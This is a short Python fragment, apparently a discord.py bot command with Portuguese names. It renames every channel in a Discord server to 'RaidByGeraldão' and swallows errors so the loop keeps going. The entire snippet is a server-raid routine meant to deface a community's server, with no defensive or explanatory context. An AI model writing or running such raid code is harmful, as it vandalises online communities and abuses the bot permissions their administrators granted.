novo_nome = "𝚁𝚊𝚒𝚍𝙱𝚢𝙶𝚎𝚛𝚊𝚕𝚍𝚊̃𝚘"

for canal in ctx.guild.channels:
    try:
        await canal.edit(name=novo_nome)
    except Exception as e:
        print(f"Erro em {canal.name}: {e}")
